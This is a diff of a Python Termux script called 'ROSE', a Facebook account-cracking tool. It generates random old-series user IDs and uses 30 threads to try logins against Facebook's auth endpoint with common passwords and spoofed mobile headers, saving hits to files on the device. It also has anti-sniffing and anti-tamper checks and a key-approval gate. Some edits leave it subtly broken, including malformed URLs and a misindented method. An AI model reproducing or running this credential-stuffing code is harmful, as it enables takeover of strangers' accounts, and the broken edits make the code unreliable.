@@ -27,11 +27,9 @@ from requests.exceptions import ConnectionError
 from requests import api, models, sessions
 requests.urllib3.disable_warnings()
 
-
 # Initial setup and promotion
 os.system('clear')
 print('\x1b[38;5;46mROSE SERVER LOADING....')
-
 
 os.system('pip uninstall requests chardet urllib3 idna certifi -y')
 os.system('pip install chardet urllib3 idna certifi requests')
@@ -40,15 +38,12 @@ os.system('pip install beautifulsoup4')
 print('loading Modules ...\n')
 
 # --- GITHUB APPROVAL SYSTEM ---
-# --- GITHUB APPROVAL SYSTEM ---
 def rose_approval():
     os.system('clear')
-    # Aapka unique key identifier
     uuid_raw = str(os.getlogin()) + str(os.getuid())
     key = hashlib.md5(uuid_raw.encode()).hexdigest().upper()[:12]
     
-    # Yahan apni GitHub link lagayein jahan approved keys hongi
-    github_link = "https://github.com/bayezidbostami404/ROSE-A/blob/main/Approval-3"
+    github_link = "https://github.com/bayezidbostami404/ROSE-A"
     
     print('''\033[1;32m ┌──────────────────────────────────────┐\033[0m
 \033[1;31m │ \033[1;32m██████╗  ██████╗ ███████╗███████╗\033[1;31m   │
@@ -79,24 +74,20 @@ def rose_approval():
             time.sleep(2)
         else:
             print(" \x1b[1;31mKey Is Not Approved. Exiting...")
-            sys.exit() 
+            sys.exit()
     except:
         sys.exit()
 
 # Initial setup and promotion
-rose_approval() 
+rose_approval()
 
 os.system('clear')
-os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-os.system('pip install httpx pip install beautifulsoup4')
+os.system('pip uninstall requests chardet urllib3 idna certifi -y > /dev/null 2>&1')
+os.system('pip install chardet urllib3 idna certifi requests httpx beautifulsoup4 > /dev/null 2>&1')
 print('loading Modules ...\n')
 os.system('clear')
 
-
-
 # --- Anti-tamperings and Security Checks ---
-# The script checks if the source code of the 'requests' library has been modified
-# or if packet sniffing tools are being used.
 try:
     api_body = open(api.__file__, 'r').read()
     models_body = open(models.__file__, 'r').read()
@@ -109,17 +100,16 @@ except:
     pass
 
 class sec:
-    """
-    A security class to detect debugging and packet sniffing tools.
-    """
     def __init__(self):
         self.__module__ = __name__
         self.__qualname__ = 'sec'
-        # Paths to check for modifications
+        
+        # dynamic python version path lookup to prevent crash
+        py_ver = f"python{sys.version_info.major}.{sys.version_info.minor}"
         paths = [
-            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
-            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
-            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
+            f'/data/data/com.termux/files/usr/lib/{py_ver}/site-packages/requests/sessions.py',
+            f'/data/data/com.termux/files/usr/lib/{py_ver}/site-packages/requests/api.py',
+            f'/data/data/com.termux/files/usr/lib/{py_ver}/site-packages/requests/models.py'
         ]
         for path in paths:
             try:
@@ -133,7 +123,7 @@ class sec:
         if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
             self.fuck()
 
-    def fuck(self):
+        def fuck(self):
         """
         Terminates the script if tampering is detected.
         """
@@ -143,7 +133,6 @@ class sec:
 
     def linex(self):
         print('\x1b[38;5;48m-----------------------------------------')
-
 
 # Global variables
 method = []
@@ -159,55 +148,47 @@ G = '\x1b[38;5;46m'
 Y = '\x1b[38;5;220m'
 PP = '\x1b[38;5;203m'
 RR = '\x1b[38;5;196m'
-GS = '\x1b[38;5;40m'
+GS = '\x1b[38;5;48m'
 W = '\x1b[1;37m'
 
 def windows():
     """
     Generates a modern, randomized Windows User-Agent string (Variant A).
     """
-    # Modernized older-style fallback but with updated Chrome builds
-    aV = random.choice(range(10, 20))
+    av = random.choice(range(10, 20))
     chrome_major_old = random.choice(range(100, 115))
-    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.1; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_old}.0.{random.choice(range(5000, 6500))}.0 Safari/537.36"
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.1; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_old}.0.{random.choice(range(5000, 6000))}.{random.choice(range(1, 150))} Safari/537.36"
     
-    # Mid-range modern User-Agent
     bz = f"537.36"
     chrome_major_mid = random.choice(range(115, 125))
-    B = f"Mozilla/5.0 (Windows NT {random.choice([10, 11])}.0; Win64; x64) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{chrome_major_mid}.0.{random.choice(range(6000, 6800))}.{random.choice(range(1, 150))} Safari/{bz}"
+
+    B = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}.0; Win64; x64) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{chrome_major_mid}.0.{random.choice(range(6000, 6800))}.{random.choice(range(1, 150))} Safari/537.36"
     
-    # WOW64 (32-bit browser on 64-bit OS) variant
     chrome_major_wow = random.choice(range(120, 130))
     C = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_wow}.0.{random.choice(range(6000, 6900))}.{random.choice(range(1, 150))} Safari/537.36"
     
-    # Cutting-edge modern User-Agent (Chrome 130 - 142+)
     chrome_latest = random.choice(range(130, 143))
     D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_latest}.0.{random.choice(range(6500, 7200))}.0 Safari/537.36"
     
     return random.choice([A, B, C, D])
 
-
 def window1():
     """
     Generates a highly updated, modern Windows User-Agent string (Variant B).
     """
-    # Standard Modern win 10/11 template
     chrome_major = random.choice(range(120, 140))
     build_1 = random.choice(range(6000, 7100))
-    A = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])} ; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{build_1}.0 Safari/537.36"
+    A = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{build_1}.0 Safari/537.36"
     
-    # Alternative layout with specific patch versions
     chrome_major_alt = random.choice(range(125, 142))
     build_2 = random.choice(range(6200, 7150))
     patch_2 = random.choice(range(50, 250))
     B = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_alt}.0.{build_2}.{patch_2} Safari/537.36"
     
-    # Compatibility style for enterprise networks
     chrome_major_ent = random.choice(range(118, 135))
     build_3 = random.choice(range(5800, 6800))
     C = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.choice(range(110, 130))}.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_ent}.0.{build_3}.0 Safari/537.36"
     
-    # Ultra-latest builds (Chrome 140+)
     latest_build = random.randint(7000, 7500)
     latest_patch = random.randint(100, 300)
     chrome_ultra = random.choice(range(140, 146))
@@ -216,7 +197,7 @@ def window1():
     return random.choice([A, B, C, D])
 
 # Set window title
-sys.stdout.write('\x1b]2; [ ROSE ] \x07') 
+sys.stdout.write('\x1b]2; [ ROSE ] \x07')
 
 # ROSE Clover Logo - Green - Version 2.5
 def __banner__():
@@ -234,18 +215,15 @@ def __banner__():
  │ \033[1;37m╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝\033[1;31m   │
  \033[1;32m └──────────────────────────────────────┘\033[0m''')
 
-║\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;92m\x1b[10;91m<•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[0;92m\x1b[10;92m║
-
-\x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
-\033[1;93m║ Author    : ROSE                            ║
-\033[1;92m║ Facebook  : BAYEZID.BOSTAMI.3705157         ║
-\033[1;96m║ GitHub    : BAYEZIDBOSTAMI404               ║
-\033[1;95m║ Telegram  : ROSE_404                        ║
-\033[1;91m║ Tool      : FREE FOR ACS IT                 ║
-\033[1;97m║ Version   : 2.5.6                           ║
-\x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[0m                      
-\033[0m""")
-
+    print('\x1b[1;97m[\x1b[1;92m WORKING WIFI+MOBILE DATA \x1b[1;97m]')
+    print('\033[1;34m┌────────────────────────────────────────┐\033[0m')
+    print('\033[1;34m│ \033[1;33mAuthor    \033[1;37m: \033[1;32mROSE                   \033[1;34m│\033[0m')
+    print('\033[1;34m│ \033[1;33mFacebook  \033[1;37m: \033[1;32mBAYEZID.BOSTAMI.3785157\033[1;34m│\033[0m')
+    print('\033[1;34m│ \033[1;33mGitHub    \033[1;37m: \033[1;32mBAYEZIDBOSTAMI404      \033[1;34m│\033[0m')
+    print('\033[1;34m│ \033[1;33mTelegram  \033[1;37m: \033[1;32mROSE_404               \033[1;34m│\033[0m')
+    print('\033[1;34m│ \033[1;33mTool      \033[1;37m: \033[1;32mFREE FOR ACS IT        \033[1;34m│\033[0m')
+    print('\033[1;34m│ \033[1;33mVersion   \033[1;37m: \033[1;32m2.5.6                  \033[1;34m│\033[0m')
+    print('\033[1;34m└────────────────────────────────────────┘\033[0m')
 
 def creationyear(uid):
     """
@@ -302,47 +280,41 @@ def creationyear(uid):
     else:
         return ''
 
-
 def clear():
     os.system('clear')
 
-
 def linex():
-    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-
+    print('\x1b[38;5;48m─────────────────────────────────────────\033[0m')
 
 def BNG_71_():
     """
     Main menu function.
     """
-    ____banner____()
-    print('\x1b[10;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
-    print('\x1b[10;92m┃ \x1b[38;5;196m(A)\x1b[38;5;46m OLD CLONE\x1b[10;92m                         ┃')
-    print('\x1b[10;92m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
-    __Bayezid__ = input('\x1b[38;5;196m [+]\x1b[10;92m CHOOSE : \x1b[0m')
-    if __Bayezid__ in ('A', 'a', '01', '1'):
+    __banner__()
+    print('\x1b[38;5;46m┌────────────────────────────────────────┐\x1b[0m')
+    print('\x1b[38;5;46m│ \x1b[38;5;196m[A]\x1b[38;5;197m OLD CLONE                          \x1b[38;5;46m│\x1b[0m')
+    print('\x1b[38;5;46m└────────────────────────────────────────┘\x1b[0m')
+    _Bayezid_ = input('\x1b[38;5;196m [+] \x1b[38;5;46mCHOOSE : \x1b[0m')
+    if _Bayezid_ in ('A', 'a', '01', '1'):
         old_clone()
     else:
-        print(f"\n    {rad}Choose Valid Option... ")
+        print(f"\n{rad}[!] Choose Valid Option...")
         time.sleep(2)
         BNG_71_()
-
 
 def old_clone():
     """
     Menu for selecting old account cloning type.
     """
-    ____banner____()
-    print('\x1b[10;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
-    print('\x1b[10;92m┃ \x1b[38;5;196m(A)\x1b[38;5;46m ALL SERIES\x1b[10;92m                        ┃')
-    print('\x1b[10;92m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
-    print('\x1b[10;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
-    print('\x1b[10;92m┃ \x1b[38;5;196m(B)\x1b[38;5;46m 100003/4 SERIES\x1b[10;92m                    ┃')
-    print('\x1b[10;92m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
-    print('\x1b[10;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
-    print('\x1b[10;92m┃ \x1b[38;5;196m(C)\x1b[38;5;46m 2009 series\x1b[10;92m                       ┃')
-    print('\x1b[10;92m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
-    _input = input(f"  \x1b[38;5;196m     [+]\x1b[10;92m CHOOSE :  {W}: {Y}")
+    __banner__()
+    print('\x1b[38;5;46m┌────────────────────────────────────────┐\x1b[0m')
+    print('\x1b[38;5;46m│ \x1b[38;5;196m[A]\x1b[38;5;197m ALL SERIES                         \x1b[38;5;46m│\x1b[0m')
+    print('\x1b[38;5;46m├────────────────────────────────────────┤\x1b[0m')
+    print('\x1b[38;5;46m│ \x1b[38;5;196m[B]\x1b[38;5;197m 100003/4 SERIES                    \x1b[38;5;46m│\x1b[0m')
+    print('\x1b[38;5;46m├────────────────────────────────────────┤\x1b[0m')
+    print('\x1b[38;5;46m│ \x1b[38;5;196m[C]\x1b[38;5;197m 2009 SERIES                        \x1b[38;5;46m│\x1b[0m')
+    print('\x1b[38;5;46m└────────────────────────────────────────┘\x1b[0m')
+    _input = input(f" \x1b[38;5;196m[+] \x1b[38;5;46mCHOOSE : {W}: {Y}")
     if _input in ('A', 'a', '01', '1'):
         old_One()
     elif _input in ('B', 'b', '02', '2'):
@@ -350,7 +322,8 @@ def old_clone():
     elif _input in ('C', 'c', '03', '3'):
         old_Tree()
     else:
-        print(f"\n[×]{rad} Choose Value Option... ")
+        print(f"\n{rad}[!] Choose Valid Option...")
+        time.sleep(2)
         BNG_71_()
 
 
@@ -358,28 +331,29 @@ def old_One():
     """
     Cloning method for accounts from 2010-2014.
     """
+    global loop
     user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mOld Code {Y}:{G} 2010-2014")
-    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mSELECT {Y}:{G} ")
+    __banner__()
+    print(f" \x1b[38;5;196m(^) \x1b[1;37mOLD CODE (Y): {G}2010-2014")
+    ask = input(f" \x1b[38;5;196m[+] \x1b[38;5;46mSELECT (Y): {Y}")
     linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
+    __banner__()
+    print(f" \x1b[38;5;196m(^) \x1b[1;37mEXAMPLE (Y): {G}20000 / 30000 / 99999")
+    limit = input(f" \x1b[38;5;196m[+] \x1b[38;5;46mSELECT (Y): {Y}")
     linex()
     star = '10000'
     for _ in range(int(limit)):
         data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
         user.append(data)
-    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
+    print(f" \x1b[38;5;196m[A] \x1b[38;5;46mMETHOD 1")
+    print(f" \x1b[38;5;196m[B] \x1b[38;5;46mMETHOD 2")
     linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    meth = input(f" \x1b[38;5;196m[+] \x1b[38;5;46mCHOOSE (A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        print('\x1b[10;92m┗━\x1b[10;97m=============================================')
+        __banner__()
+        print(f" \x1b[38;5;196m(^) \x1b[38;5;46mTOTAL ID FROM CRACK : {G}{limit}")
+        print(f" \x1b[38;5;196m(^) \x1b[38;5;46mUSE AIRPLANE MODE FOR GOOD RESULT")
+        linex() 
         for mal in user:
             uid = star + mal
             if meth == 'A':
@@ -387,22 +361,22 @@ def old_One():
             elif meth == 'B':
                 pool.submit(login_2, uid)
             else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                print(f"\n{rad}[!] INVALID METHOD SELECTED")
                 break
-
 
 def old_Tow():
     """
     Cloning method for accounts with specific prefixes.
     """
+    global loop
     user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
-    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    __banner__()
+    print(f" \x1b[38;5;196m(^) \x1b[1;37mOLD CODE (Y): {G}2010-2014")
+    ask = input(f" \x1b[38;5;196m[+] \x1b[38;5;46mSELECT (Y): {Y}")
     linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    __banner__()
+    print(f" \x1b[38;5;196m(^) \x1b[1;37mEXAMPLE (Y): {G}20000 / 30000 / 99999")
+    limit = input(f" \x1b[38;5;196m[+] \x1b[38;5;46mSELECT (Y): {Y}")
     linex()
     prefixes = ['100003', '100004']
     for _ in range(int(limit)):
@@ -410,22 +384,22 @@ def old_Tow():
         suffix = ''.join(random.choices('0123456789', k=9))
         uid = prefix + suffix
         user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
+    print(f" \x1b[38;5;196m[A] \x1b[38;5;46mMETHOD A")
+    print(f" \x1b[38;5;196m[B] \x1b[38;5;46mMETHOD B")
     linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    meth = input(f" \x1b[38;5;196m[+] \x1b[38;5;46mCHOOSE (A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
+        __banner__()
+        print(f" \x1b[38;5;196m(^) \x1b[38;5;46mTOTAL ID FROM CRACK : {G}{limit}")
+        print(f" \x1b[38;5;196m(^) \x1b[38;5;46mUSE AIRPLANE MODE FOR GOOD RESULT")
+        linex() 
         for uid in user:
             if meth == 'A':
                 pool.submit(login_1, uid)
             elif meth == 'B':
                 pool.submit(login_2, uid)
             else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                print(f"\n{rad}[!] INVALID METHOD SELECTED")
                 break
 
 
@@ -433,36 +407,37 @@ def old_Tree():
     """
     Cloning method for accounts from 2009-2010.
     """
+    global loop
     user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
-    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    __banner__()
+    print(f" \x1b[38;5;196m(^) \x1b[1;37mOLD CODE (Y): {G}2009-2010")
+    ask = input(f" \x1b[38;5;196m[+] \x1b[38;5;46mSELECT (Y): {G}")
     linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
+    __banner__()
+    print(f" \x1b[38;5;196m(^) \x1b[1;37mEXAMPLE (Y): {G}20000 / 30000 / 99999")
+    limit = input(f" \x1b[38;5;196m[+] \x1b[38;5;46mTOTAL ID COUNT (Y): {G}")
     linex()
     prefix = '1000004'
     for _ in range(int(limit)):
         suffix = ''.join(random.choices('0123456789', k=8))
         uid = prefix + suffix
         user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
+    print(f" \x1b[38;5;196m[A] \x1b[38;5;46mMETHOD A")
+    print(f" \x1b[38;5;196m[B] \x1b[38;5;46mMETHOD B")
     linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    meth = input(f" \x1b[38;5;196m[+] \x1b[38;5;46mCHOICE (A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
+        __banner__()
+        print(f" \x1b[38;5;196m(^) \x1b[38;5;46mTOTAL ID FROM CRACK : {G}{limit}")
+        print(f" \x1b[38;5;196m(^) \x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT")
+        linex() 
         for uid in user:
             if meth == 'A':
                 pool.submit(login_1, uid)
             elif meth == 'B':
                 pool.submit(login_2, uid)
             else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                print(f"\n{rad}[!] INVALID METHOD SELECTED")
                 break
 
 
@@ -473,7 +448,8 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mROSE-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
+        # এখানে কাউন্টার ব্র্যান্ডিং RAJA-M1 থেকে ROSE-M1 করা হয়েছে
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m(\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mROSE-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m{loop}{W} ")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -502,34 +478,35 @@ def login_1(uid):
             headers = {
                 'User-Agent': window1(),
                 'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
+                'Host': '://facebook.com',
                 'X-FB-Net-HNI': '25227',
                 'X-FB-SIM-HNI': '29752',
                 'X-FB-Connection-Type': 'MOBILE.LTE',
                 'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
-                'x-fb-device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Session-ID': str(uuid.uuid4()),
+                'X-FB-Device-Group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
                 'X-FB-Client-IP': 'True',
                 'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+                'X-FB-Connection-Token': 'True'
             }
-            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            res = session.post("https://b-://facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mROSE\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+            
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;46mROSE-OK\x1b[38;5;196m] \x1b[38;5;46m{uid} \x1b[1;37m| \x1b[38;5;46m{pw} \x1b[1;37m| \x1b[38;5;46m{creationyear(uid)}")
                 open('/sdcard/ROSE-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
-            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mROSE-M1\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/ROSE-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                oks.append(uid)
+            elif "://facebook.com" in res.get('error', {}).get('message', ''):       
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;220mROSE-CP\x1b[38;5;196m] \x1b[38;5;220m{uid} \x1b[1;37m| \x1b[38;5;220m{pw} \x1b[1;37m| \x1b[38;5;220m{creationyear(uid)}")
+                open('/sdcard/ROSE-OLD-M1-CP.txt', 'a').write(f"{uid}|{pw}\n")
+                cps.append(uid)
                 break
         loop += 1
     except Exception:
-        time.sleep(5)
+        time.sleep(0.1)
 
 
 def login_2(uid):
